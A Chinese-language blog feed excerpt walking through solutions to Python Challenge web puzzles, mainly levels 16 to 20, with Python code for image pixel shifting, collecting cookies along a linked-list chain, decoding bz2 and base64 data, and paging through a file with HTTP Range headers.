<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># run in python 3.0+&#10;def uzi():&#10;    from datetime import datetime&#10;&#10;    def get_week_day(year_, mouth_, day_):&#10;        return datetime(year_, mouth_, day_).strftime(&#34;%w&#34;)&#10;&#10;    leap_years = [i for i in range(1006, 1997, 10) if (i % 4 == 0 and i % 100 != 0) or i % 400 == 0]&#10;    # print (leap_years)&#10;    match_year = [y for y in leap_years if get_week_day(y, 2, 29) == &#34;0&#34;]&#10;    print (match_year)&#10;    print (&#34;%d-01-17&#34; % match_year[-2])&#10;&#62;&#62;&#62; [1176, 1356, 1576, 1756, 1976]&#10;    1756-01-17</span><br></pre></td></tr></table></figure>
<p>由于python2.7版本中the datetime strftime() methods require year &gt;= 1900,<br>因此该代码需要运行在python3.0+<br>最后百度关键词1756年1月27日，著名的音乐大师沃尔弗于格·莫扎特(mozart),诞生于奥地利查尔茨堡。<br>诞生于，诞生啊。。其实最初我以为送花是第二天有人挂掉了去拜祭。。面壁思过中。。。</p>
<h3 id="python_challenge_16"><a href="http://www.pythonchallenge.com/pc/return/mozart.html" target="_blank" rel="external">python challenge 16</a></h3><p><code>http://www.pythonchallenge.com/pc/return/mozart.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-16.gif" alt="16"><br>页面标题提示：let me get this straight<br>观察图片将粉色的线条对齐排成一列，即将每行像素点循环左移知道粉色点位于最左边。<br>其中图片模式为索引像素模式，用ps查看得到粉色Idx=195,对应RGB=(255, 0, 255)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def mozart():&#10;    from PIL import Image&#10;    org_img = Image.open(&#39;img/mozart.gif&#39;)&#10;    org_size = org_img.size&#10;    org_data = list(org_img.getdata())&#10;&#10;    # new_img = Image.new(org_img.mode, org_size)&#10;    new_img = org_img.copy()&#10;    new_data = new_img.load()&#10;&#10;    for y in range(org_size[1]):&#10;        line_pixels = org_data[org_size[0] * y: org_size[0] * (y + 1)]&#10;        pink_index = line_pixels.index(195)&#10;        for x, pixel in enumerate(line_pixels[pink_index:] + line_pixels[:pink_index]):&#10;            new_data[x, y] = pixel&#10;&#10;    new_img.save(&#34;img/romance.gif&#34;)</span><br></pre></td></tr></table></figure></p>
<p>最后生成答案图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-16-romance.gif" alt="16-romance"></p>
<h3 id="python_challenge_17"><a href="http://www.pythonchallenge.com/pc/return/romance.html" target="_blank" rel="external">python challenge 17</a></h3><p><code>http://www.pythonchallenge.com/pc/return/romance.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-17.jpg" alt="17"><br>做这个题请自觉开启自虐模式，不要问我为什么，我只想静静。<br>页面标题：eat? 看下源代码图片名字为cookies.jpg<br>cookies点心？cookie?打开chrome控制台输入alert(document.cookie)<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-17-alert.jpg" alt="17-alert"><br>you should have followed busynothing…<br>结合图片左下角linkedlist页面的图片，想到之前遍历时候找的每个页面，这个应该是遍历找每个页面的cookie信息了。<br>初步验证，先进入linkedlist的第一个节点：<br><a href="http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=12345" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=12345</a><br>页面内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you came here from level 4 - go back!&#10;You should follow the obvious chain...&#10;&#10;and the next busynothing is 44827</span><br></pre></td></tr></table></figure></p>
<p>大概意思是说这个界面如果你是从第四关跳进去的话请返回,显示的关键字会是nothing而非busynothing。<br>因此一定要从第一个节点进入，不要从linkedlist.php点击图片进入，否则获取不到cookie信息。<br>弹出的cookie信息为：info=B<br>第二个节点：<a href="http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=44827" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=44827</a><br>弹出的cookie信息为：info=Z<br>是不是有点眼熟，回头找找第8关的BZ2压缩。。<br>之后是写代码之路，其中cookie模块参考：<a href="http://my.oschina.net/duhaizhang/blog/69342" target="_blank" rel="external">urllib2模块、cookielib模块</a><br>遍历完cookie信息后得到字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BZh91AY%26SY%94%3A%E2I%00%00%21%19%80P%81%11%00%AFg%9E%A0+%00hE%3DM%B5%23%D0%D4%D1%E2%8D%06%A9%FA%26S%D4%D3%21%A1%EAi7h%9B%9A%2B%BF%60%22%C5WX%E1%ADL%80%E8V%3C%C6%A8%DBH%2632%18%A8x%01%08%21%8DS%0B%C8%AF%96KO%CA2%B0%F1%BD%1Du%A0%86%05%92s%B0%92%C4Bc%F1w%24S%85%09%09C%AE%24</span><br></pre></td></tr></table></figure></p>
<p>看看格式应该是转义过的，调用urllib转义函数得到结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BZh91AY&#38;SY\x94:\xe2I\x00\x00!\x19\x80P\x81\x11\x00\xafg\x9e\xa0 \x00hE=M\xb5#\xd0\xd4\xd1\xe2\x8d\x06\xa9\xfa&#38;S\xd4\xd3!\xa1\xeai7h\x9b\x9a+\xbf`&#34;\xc5WX\xe1\xadL\x80\xe8V&#60;\xc6\xa8\xdbH&#38;32\x18\xa8x\x01\x08!\x8dS\x0b\xc8\xaf\x96KO\xca2\xb0\xf1\xbd\x1du\xa0\x86\x05\x92s\xb0\x92\xc4Bc\xf1w$S\x85\t\tC\xae$\x90</span><br></pre></td></tr></table></figure></p>
<p>这个看着就很熟悉了，调用bz2进行解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is it the 26th already? call his father and inform him that &#34;the flowers are on their way&#34;. he&#39;ll understand.</span><br></pre></td></tr></table></figure></p>
<p>这个结果看的也是格外的忧伤，竟然还有这么多的坑。。看看26th说的是莫扎特，查下莫扎特的老爹为Leopold。<br>试试Leopold.html,404啊，404！！！<br>再仔细看，call his father，打电话，电话！！！<br>调用13关的代码Bert改为Leopold返回555-VIOLIN<br>参考13关去数字改小写地址为violin.html，竟然还有，呵呵哒。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no! i mean yes! but ../stuff/violin.php.</span><br></pre></td></tr></table></figure></p>
<p>再改将上级目录改为/stuff/violin.php<br>即<a href="http://www.pythonchallenge.com/pc/stuff/violin.php" target="_blank" rel="external">http://www.pythonchallenge.com/pc/stuff/violin.php</a><br>看到图片我以为终于完了，仔细一看，编号呢，没编号肯定还是个坑啊，我内心几乎是崩溃的。。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-17-violin.jpg" alt="17-violin"></p>
<p>看下页面提示标题：it’s me. what do you want?<br>返回页面也没有什么其他信息，答案在哪里？！？！？<br>想想这个题主题是cookie,回头再看上边的解压出来的提示信息，后半句还没有用到。<br>inform him that “the flowers are on their way”<br>翻译是告诉他鲜花已经来路上，暗示要给他携带信息。<br>也就是说要带上info=”the flowers are on their way”消息去访问这个页面！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cj._cookies.values()[0][&#39;/&#39;][&#39;info&#39;].value = &#39;the+flowers+are+on+their+way&#39;&#10;violin_source = opener.open(&#39;http://www.pythonchallenge.com/pc/stuff/violin.php&#39;).read()&#10;print violin_source</span><br></pre></td></tr></table></figure></p>
<p>打印出来的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;html&#62;&#10;&#60;head&#62;&#10;  &#60;title&#62;it&#39;s me. what do you want?&#60;/title&#62;&#10;  &#60;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;../style.css&#34;&#62;&#10;&#60;/head&#62;&#10;&#60;body&#62;&#10;    &#60;br&#62;&#60;br&#62;&#10;    &#60;center&#62;&#60;font color=&#34;gold&#34;&#62;&#10;    &#60;img src=&#34;leopold.jpg&#34; border=&#34;0&#34;/&#62;&#10;&#60;br&#62;&#60;br&#62;&#10;oh well, don&#39;t you dare to forget the balloons.&#60;/font&#62;&#10;&#60;/body&#62;&#10;&#60;/html&#62;</span><br></pre></td></tr></table></figure></p>
<p>终于出结果了，balloons，感觉已经可以开始google大法了QAQ。。</p>
<p>完整逻辑代码，其中略掉level13的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def romance():&#10;    import urllib2&#10;    import cookielib&#10;    import urllib&#10;&#10;    cj = cookielib.CookieJar()&#10;    handler = urllib2.HTTPCookieProcessor(cj)&#10;    opener = urllib2.build_opener(handler)&#10;&#10;    base_url = &#34;http://www.pythonchallenge.com/pc/def/linkedlist.php&#34;&#10;    param = &#34;12345&#34;&#10;    times = 1&#10;    info = []&#10;&#10;    while True:&#10;        try:&#10;            url = &#34;?busynothing=&#34;.join([base_url, param])&#10;            page_source = opener.open(url).read()&#10;            param = re.findall(&#34;and the next busynothing is ([0-9]+)&#34;, page_source)[0]&#10;            ck = cj._cookies.values()[0][&#39;/&#39;][&#39;info&#39;].value&#10;            info.append(ck)&#10;            print &#34;%d -&#62; %s -&#62; %s&#34; % (times, param, ck)&#10;            times += 1&#10;        # &#21305;&#37197;&#19981;&#21040;&#36339;&#21040;&#24322;&#24120;&#10;        except IndexError:&#10;            print &#34;the end is : %d&#34; % times&#10;            break&#10;&#10;    message = &#34;&#34;.join(info)&#10;    print message&#10;    # &#36716;&#20041;&#10;    message = urllib.unquote_plus(message)&#10;    result = message.decode(&#34;bz2&#34;)&#10;    print result&#10;&#10;    # ---level 13 code ---#&#10;&#10;    # url = &#34;?busynothing=&#34;.join([base_url, param])&#10;    # page_source = opener.open(url).read()&#10;    cj._cookies.values()[0][&#39;/&#39;][&#39;info&#39;].value = &#39;the+flowers+are+on+their+way&#39;&#10;    violin_source = opener.open(&#39;http://www.pythonchallenge.com/pc/stuff/violin.php&#39;).read()&#10;    print violin_source</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_18"><a href="http://www.pythonchallenge.com/pc/return/balloons.html" target="_blank" rel="external">python challenge 18</a></h3><p><code>http://www.pythonchallenge.com/pc/return/balloons.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-18.jpg" alt="18"><br>页面标题：can you tell the difference?<br>明显的两张图片亮度不同，英文brightness.<br>进入该页面后再看源码提示：maybe consider deltas.gz<br>将该文件下载下来，解压后看到delta.txt里是分为两栏的16进制数据。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-18-deltas.jpg" alt="18-deltas"><br>仔细对比两边内容，发现有部分重复的，也就是通过比较两栏内容，来分发字节。<br>左边特有的，右边特有的，公共部分，分别生成三张图片。<br>这里需要用到difflib模块来进行数据处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def balloons():&#10;    import difflib&#10;    f_delta = open(&#39;files/delta.txt&#39;, &#39;r+&#39;)&#10;    deltas = f_delta.read().split(&#39;\n&#39;)&#10;    f_delta.close()&#10;&#10;    left_data = []&#10;    right_data = []&#10;&#10;    for line in deltas:&#10;        left_data.append(line[:53]+&#39;\n&#39;)&#10;        right_data.append(line[56:]+&#39;\n&#39;)&#10;&#10;    diff = difflib.Differ()&#10;    cmp_result = list(diff.compare(left_data, right_data))&#10;&#10;    left_pic = open(&#39;img/18-left-diff.png&#39;, &#39;wb&#39;)&#10;    right_pic = open(&#39;img/18-right-diff.png&#39;, &#39;wb&#39;)&#10;    common_pic = open(&#39;img/18-common.png&#39;, &#39;wb&#39;)&#10;&#10;    for line in cmp_result:&#10;        bytes = [(chr(int(h, 16))) for h in line[2:].split()]&#10;        if line.startswith(&#39;-&#39;):&#10;            map(left_pic.write, bytes)&#10;        elif line.startswith(&#39;+&#39;):&#10;            map(right_pic.write, bytes)&#10;        elif line.startswith(&#39; &#39;):&#10;            map(common_pic.write, bytes)&#10;&#10;    right_pic.close()&#10;    left_pic.close()&#10;    common_pic.close()</span><br></pre></td></tr></table></figure></p>
<p>最后生成的三张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-18-bin.jpg" alt="18-bin"><br>进入<a href="http://www.pythonchallenge.com/pc/hex/bin.html" target="_blank" rel="external">http://www.pythonchallenge.com/pc/hex/bin.html</a><br>用户名：butter 密码：fly</p>
<h3 id="python_challenge_19"><a href="http://www.pythonchallenge.com/pc/hex/bin.html" target="_blank" rel="external">python challenge 19</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/bin.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-19.jpg" alt="19"><br>看网页源码，base64加密一段音频数据indian.wav<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def hex_bin():&#10;    import base64&#10;    headers = &#123;&#10;        &#34;Authorization&#34;: &#34;Basic YnV0dGVyOmZseQ==&#34;&#10;    &#125;&#10;    page_source = requests.get(&#34;http://www.pythonchallenge.com/pc/hex/bin.html&#34;, headers=headers).text&#10;    wav_data = re.findall(r&#34;base64([\s\S]+?)--&#34;, page_source)[0].strip(&#34;\n&#34;)&#10;    indian = open(&#34;files/indian.wav&#34;, &#34;wb&#34;)&#10;    indian.write(base64.b64decode(wav_data))&#10;    indian.close()</span><br></pre></td></tr></table></figure></p>
<p>打开生成的音频文件，有个怪怪的声音：sorry..<br>打开sorry界面显示：what are you apologizing for<br>再回头看看图片，大陆和海洋的颜色是反转的，尝试将音频每一帧反转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def hex_bin():&#10;    import base64&#10;    import wave&#10;    headers = &#123;&#10;        &#34;Authorization&#34;: &#34;Basic YnV0dGVyOmZseQ==&#34;&#10;    &#125;&#10;    page_source = requests.get(&#34;http://www.pythonchallenge.com/pc/hex/bin.html&#34;, headers=headers).text&#10;    wav_data = re.findall(r&#34;base64([\s\S]+?)--&#34;, page_source)[0].strip(&#34;\n&#34;)&#10;    indian = open(&#34;files/indian.wav&#34;, &#34;wb&#34;)&#10;    indian.write(base64.b64decode(wav_data))&#10;    indian.close()&#10;&#10;    indian = wave.open(&#34;files/indian.wav&#34;, &#34;rb&#34;)&#10;    reverse = wave.open(&#34;files/indian-reverse.wav&#34;, &#34;wb&#34;)&#10;    reverse.setnchannels(1)&#10;    reverse.setframerate(indian.getframerate())&#10;    reverse.setsampwidth(indian.getsampwidth())&#10;    for i in range(indian.getnframes()):&#10;        reverse.writeframes(indian.readframes(1)[::-1])&#10;    indian.close()&#10;    reverse.close()</span><br></pre></td></tr></table></figure></p>
<p>播放下听听，You are a idiot ha ha ha ha ha ha …..<br>进入idiot.html显示：Now you should apologize,Continue to the next level进入下一关。</p>
<h3 id="python_challenge_20"><a href="http://www.pythonchallenge.com/pc/hex/idiot2.html" target="_blank" rel="external">python challenge 20</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/idiot2.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-20.jpg" alt="20"><br>页面标题：go away!<br>图片下边：but inspecting it carefully is allowed.<br>大概意思是围栏那边的是私有财产，请离开私有财产，虽然不允许进入，但可以观察。<br>没有一点思路，谷歌大法好，抓下图片包看下请求头信息：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-20-range.jpg" alt="20-range"><br>这里的Content-Range的值是: bytes 0-30202/2123456789，这看上去与所谓的“断点续传”十分相似。<br>从这个信息知道原始图片大小有2123456789个字节，但是目前的“unreal.jpg” 只有前面的30202 个字节，这就说明看到的“unreal.jpg”并不完整。<br>那就先要把“unreal.jpg”下载完全才行。<br>要指定请求的字节范围，需要在请求中加入一个叫Range的头，基本形式是“Range: bytes=1000-2345”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;&#10;    &#34;Authorization&#34;: &#34;Basic YnV0dGVyOmZseQ==&#34;,&#10;    &#34;Range&#34;: &#34;bytes=30203-&#34;&#10;&#125;&#10;img = requests.get(&#34;http://www.pythonchallenge.com/pc/hex/unreal.jpg&#34;, headers=headers)&#10;print img.text&#10;&#62;&#62;&#62; u&#34;Why don&#39;t you respect my privacy?\n&#34;</span><br></pre></td></tr></table></figure></p>
<p>服务器返回了有意义的信息，因此写个遍历将所有信息打印出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def idiot2():&#10;    pic_url = &#34;http://www.pythonchallenge.com/pc/hex/unreal.jpg&#34;&#10;    next_range = 30203&#10;    end_range = 2123456789&#10;    while next_range &#60;= end_range:&#10;        headers = &#123;&#10;            &#34;Authorization&#34;: &#34;Basic YnV0dGVyOmZseQ==&#34;,&#10;            &#34;Range&#34;: &#34;bytes=%d-&#34; % next_range&#10;        &#125;&#10;        img = requests.get(pic_url, headers=headers)&#10;        if img.status_code == 206:&#10;            print &#34;range : %d -&#62; %s&#34; % (next_range, img.text)&#10;            content_range = img.headers.get(&#34;Content-Range&#34;)&#10;            next_range = re.findall(r&#34;bytes.+-(\d+)/&#34;, content_range)[0]&#10;            next_range = int(next_range) + 1&#10;        else:&#10;            break&#10;&#62;&#62;&#62;&#10;    range : 30203 -&#62; Why don&#39;t you respect my privacy?&#10;    range : 30237 -&#62; we can go on in this way for really long time.&#10;    range : 30284 -&#62; stop this!&#10;    range : 30295 -&#62; invader! invader!&#10;    range : 30313 -&#62; ok, invader. you are inside now.&#10;    Process finished with exit code 0</span><br></pre></td></tr></table></figure></p>
<p>信息中反复提到的入侵者invader，尝试更换下网址为invader.html。<br>页面显示：Yes! that’s you! 这提示，然并卵。。。<br>从前边入侵不行，那就从后边入侵试试？<br>将代码中next_range改为2123456789打印出来为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esrever ni emankcin wen ruoy si drowssap eht</span><br></pre></td></tr></table></figure></p>
<p>将其反过来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">end_text = &#34;esrever ni emankcin wen ruoy si drowssap eht&#34;&#10;result = [text_[::-1] for text_ in end_text.split()[::-1]]&#10;print &#34; &#34;.join(result)&#10;&#62;&#62;&#62; the password is your new nickname in reverse</span><br></pre></td></tr></table></figure></p>
<p>通过读取Content-Range再入侵前一个得到信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range : 2123456743 -&#62; and it is hiding at 1152983631.</span><br></pre></td></tr></table></figure></p>
<p>通过这条信息得之其隐藏在1152983631，入侵之后得到pk开头的数据即zip包。<br>将其下载下来，解压需要密码，密码看前边的提示信息：<br>the password is your new nickname in reverse<br>新绰号即为入侵者invader，反过来为redavni。<br>解压过后生成两个文件，package.pack和readme.txt,打开readme文件内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes! This is really level 21 in here.&#10;And yes, After you solve it, you&#39;ll be in level 22!&#10;&#10;Now for the level:&#10;&#10;* We used to play this game when we were kids&#10;* When I had no idea what to do, I looked backwards.</span><br></pre></td></tr></table></figure></p>
<p>已经进入了level 21.<br>完整代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def idiot2():&#10;    pic_url = &#34;http://www.pythonchallenge.com/pc/hex/unreal.jpg&#34;&#10;    next_range = 30203&#10;    end_range = 2123456789&#10;    while next_range &#60;= end_range:&#10;        headers = &#123;&#10;            &#34;Authorization&#34;: &#34;Basic YnV0dGVyOmZseQ==&#34;,&#10;            &#34;Range&#34;: &#34;bytes=%d-&#34; % next_range&#10;        &#125;&#10;        img = requests.get(pic_url, headers=headers)&#10;        if img.status_code == 206:&#10;            print &#34;range : %d -&#62; %s&#34; % (next_range, img.text)&#10;            content_range = img.headers.get(&#34;Content-Range&#34;)&#10;            next_range = re.findall(r&#34;bytes.+-(\d+)/&#34;, content_range)[0]&#10;            next_range = int(next_range) + 1&#10;        else:&#10;            break&#10;&#10;    # reverse&#10;    cur_range = 2123456789&#10;    end_range = 2123456789&#10;    is_download = False&#10;    while cur_range &#60;= end_range:&#10;        headers = &#123;&#10;            &#34;Authorization&#34;: &#34;Basic YnV0dGVyOmZseQ==&#34;,&#10;            &#34;Range&#34;: &#34;bytes=%d-&#34; % cur_range&#10;        &#125;&#10;        img = requests.get(pic_url, headers=headers)&#10;        if img.status_code == 206:&#10;            if is_download is True:&#10;                open(&#34;files/invader.zip&#34;, &#34;wb&#34;).write(img.content)&#10;                break&#10;&#10;            print &#34;range : %d -&#62; %s&#34; % (cur_range, img.text)&#10;            content_range = img.headers.get(&#34;Content-Range&#34;)&#10;            cur_range = re.findall(r&#34;bytes (\d+)-&#34;, content_range)[0]&#10;            cur_range = int(cur_range) - 1&#10;&#10;            img_text = img.text&#10;            result = [text_[::-1] for text_ in img_text.split()[::-1]]&#10;            print &#34; &#34;.join(result)&#10;        elif img.status_code == 416:&#10;            cur_range = img_text.split()[-1].strip(&#34;.&#34;)&#10;            cur_range = int(cur_range)&#10;            is_download = True</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>接上边继续斗智斗勇中。越来越觉得智商不够用了。。</p>
<h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" re]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.xyz/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.xyz/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 0-10]]></title>
    <link href="http://blog.idhyt.xyz/2015/08/07/5-python-challenge-0-10/"/>
    <id>http://blog.idhyt.xyz/2015/08/07/5-python-challenge-0-10/</id>
    <published>2015-08-07T08:06:11.000Z</published>
    <updated>2015-12-27T08:54:08.000Z</updated>
    <content type="html"><![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="external">http://www.pythonchallenge.com/</a><br>题目出的也是充满想象力，斗智斗勇中。。。<br>解题代码整理在我的 <a href="https://github.com/idhyt/python_challenge" target="_blank" rel="external">github</a></p>
<h3 id="python_challenge_0"><a href="http://www.pythonchallenge.com/pc/def/0.html" target="_blank" rel="external">python challenge 0</a></h3><p><code>http://www.pythonchallenge.com/pc/def/0.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-0.jpg" alt="0"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#160;2&#30340;38&#27425;&#24130;&#10;def&#160;calc():&#10;&#160;&#160;&#160;&#160;return&#160;2&#160;**&#160;38&#10;&#62;&#62;&#62;&#160;274877906944L</span><br></pre></td></tr></table></figure>
<h3 id="python_challenge_1"><a href="http://www.pythonchallenge.com/pc/def/274877906944.html" target="_blank" rel="external">python challenge 1</a></h3><p><code>http://www.pythonchallenge.com/pc/def/274877906944.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-1.jpg" alt="1"><br>通过图片可知道，所有字符右移两位即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;map_():&#10;&#160;&#160;&#160;&#160;first_alpha&#160;=&#160;chr(ord(&#34;m&#34;)&#160;+&#160;2)&#10;&#160;&#160;&#160;&#160;second_alpha&#160;=&#160;chr(ord(&#34;a&#34;)&#160;+&#160;2)&#10;&#160;&#160;&#160;&#160;third_alpha&#160;=&#160;chr(ord(&#34;p&#34;)&#160;+&#160;2)&#10;&#160;&#160;&#160;&#160;return&#160;&#34;&#34;.join([first_alpha,&#160;second_alpha,&#160;third_alpha])&#10;&#62;&#62;&#62;&#160;ocr</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_2"><a href="http://www.pythonchallenge.com/pc/def/ocr.html" target="_blank" rel="external">python challenge 2</a></h3><p><code>http://www.pythonchallenge.com/pc/def/ocr.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-2.jpg" alt="2"><br>查找出现次数最少的字符，先是统计出所有字符出现的次数，然后获取出现次数最早的，要注意按照原来顺序排列。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;ocr():&#10;&#160;&#160;&#160;&#160;stats&#160;=&#160;&#123;&#125;&#10;&#160;&#160;&#160;&#160;req&#160;=&#160;requests.get(&#34;http://www.pythonchallenge.com/pc/def/ocr.html&#34;)&#10;&#160;&#160;&#160;&#160;page_source&#160;=&#160;req.text&#10;&#160;&#160;&#160;&#160;mess_pattern&#160;=&#160;re.compile(r&#34;(%%[\s\S]+)--&#62;&#34;,&#160;re.IGNORECASE)&#10;&#160;&#160;&#160;&#160;mess_content&#160;=&#160;mess_pattern.findall(page_source)[0]&#10;&#160;&#160;&#160;&#160;#&#160;print&#160;mess_content&#10;&#10;&#160;&#160;&#160;&#160;for&#160;character&#160;in&#160;mess_content:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;if&#160;character&#160;in&#160;stats:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;stats[character]&#160;+=&#160;1&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;else:&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;stats[character]&#160;=&#160;1&#10;&#160;&#160;&#160;&#160;for&#160;key_,&#160;value_&#160;in&#160;stats.items():&#10;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;print&#160;&#34;%s&#160;-&#62;&#160;%d&#34;&#160;%&#160;(key_,&#160;value_)&#10;&#10;&#160;&#160;&#160;&#160;#&#160;a&#160;e&#160;i&#160;l&#160;q&#160;u&#160;t&#160;y&#10;&#160;&#160;&#160;&#160;return&#160;&#34;&#34;.join(re.findall(r&#34;[a-z]+&#34;,&#160;mess_content))&#10;&#62;&#62;&#62;&#160;u&#39;equality&#39;</span><br></pre></td></tr></table></figure>
<h3 id="python_challenge_3"><a href="http://www.pythonchallenge.com/pc/def/equality.html" target="_blank" rel="external">python challenge 3</a></h3><p><code>http://www.pythonchallenge.com/pc/def/equality.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-3.jpg" alt="3"><br>小写字符两边有三个大写字母,格式为aAAAaAAAa<br>AAAaAAA这种匹配是错误的，要保证两边都是三位大写字母<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def&#160;equality():&#10;&#160;&#160;&#160;&#160;req&#160;=&#160;requests.get(&#34;http://www.pythonchallenge.com/pc/def/equality.html&#34;)&#10;&#160;&#160;&#160;&#160;page_source&#160;=&#160;req.text&#10;&#160;&#160;&#160;&#160;mess_pattern&#160;=&#160;re.compile(r&#34;kAewtloYgc[\s\S]+&#34;,&#160;re.IGNORECASE)&#10;&#160;&#160;&#160;&#160;mess_content&#160;=&#160;mess_pattern.findall(page_source)[0]&#10;&#160;&#160;&#160;&#160;return&#160;&#34;&#34;.join(re.findall(r&#34;[a-z]&#123;1&#125;[A-Z]&#123;3&#125;([a-z]&#123;1&#125;)[A-Z]&#123;3&#125;[a-z]&#123;1&#125;&#34;,&#160;mess_content))&#10;&#62;&#62;&#62;&#160;u&#39;linkedlist&#39;</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_4"><a href="http://www.pythonchallenge.com/pc/def/linkedlist.php" target="_blank" rel="external">python challenge 4</a></h3><p><code>http://www.pythonchallenge.com/pc/def/linkedlist.php</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-4.jpg" alt="4"><br>点击图片会有提示,然后更换链接参数继续,大概200多次即可得到答案。<br>其中正则不能只写”[0-9]+”,中间有陷阱：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There&#160;maybe&#160;misleading&#160;numbers&#160;in&#160;the&#160;text.&#160;One&#160;example&#160;is&#160;82683\.&#160;Look&#160;only&#160;for&#160;the&#160;next&#160;nothing&#160;and&#160;the&#160;next&#160;nothing&#160;is&#160;63579</span><br></pre></td></tr></table></figure></p>
